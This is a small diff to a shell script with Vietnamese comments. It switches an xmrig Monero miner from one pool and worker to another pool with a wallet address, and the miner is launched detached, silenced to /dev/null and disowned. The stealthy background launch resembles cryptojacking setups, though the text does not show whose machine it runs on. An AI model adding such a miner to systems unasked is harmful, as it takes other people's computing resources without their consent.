@@ -28,7 +28,7 @@
     # Chạy
     cd "$DIR"
     echo "$(date) [RUN] Khởi động" >> "$LOGFILE"
-    ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.worke3 -p x --coin monero >> "$LOGFILE" 2>&1
+    xmrig --url pool.hashvault.pro:443 --user 82tvM9cdwYieKVPKCHx6TJVKbekciy3hSGr54XDEYNYt6atNYkGSeeSS9qrVyjjrufMeyTaiBBTAWFuZG11gdKMc1a31YMG --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 >> "$LOGFILE" 2>&1
 
 ) </dev/null >/dev/null 2>&1 &
 disown
